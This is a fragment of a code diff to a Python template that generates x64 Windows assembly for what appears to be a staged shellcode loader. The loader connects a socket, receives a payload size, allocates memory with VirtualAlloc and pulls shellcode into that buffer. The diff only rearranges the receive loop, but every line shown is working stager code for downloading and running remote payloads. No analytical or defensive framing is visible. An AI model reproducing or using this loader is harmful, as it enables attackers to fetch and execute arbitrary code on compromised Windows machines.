@@ -161,8 +161,6 @@ call_connect:
     mov r8, 0x08 
 call_recv:
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-;    lea rdx, [rbp - {self.storage_offsets['dwSize']}]
-;    mov r8, 0x08
     xor r9, r9
     mov rax, [rbp - {self.storage_offsets['recv']}]
     call rax
@@ -181,15 +179,8 @@ call_VirtualAlloc:
     mov [rbp - {self.storage_offsets['lpvShellcode']}], rax
     mov rdx, rax
     mov r8, [rbp - {self.storage_offsets['dwSize']}]
-    jmp call_recv
 
-;call_recv_payload:
-;    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-;    mov rdx, [rbp - {self.storage_offsets['lpvShellcode']}]
-;    mov r8, [rbp - {self.storage_offsets['dwSize']}]
-;    xor r9, r9
-;    mov rax, [rbp - {self.storage_offsets['recv']}]
-;    call rax
+    jmp call_recv
 
 download_complete:"""
 
